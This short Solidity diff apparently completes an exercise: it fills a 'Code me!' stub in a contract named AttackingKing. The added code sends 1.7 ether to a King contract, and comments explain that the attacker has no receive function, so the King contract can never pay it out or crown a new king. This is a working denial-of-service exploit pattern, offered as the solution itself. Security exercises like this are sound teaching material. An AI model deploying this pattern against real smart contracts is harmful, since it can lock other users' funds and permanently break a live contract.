@@ -11,6 +11,9 @@ contract AttackingKing {
     }
 
     function hackContract() external {
-        // Code me!
+        // this contract has no receive or way to pay out, 
+        // so the King contract can't pay it out or assign a new king.
+       address(contractAddress).call{value: 1.7 ether}("");    
+
     }
 }
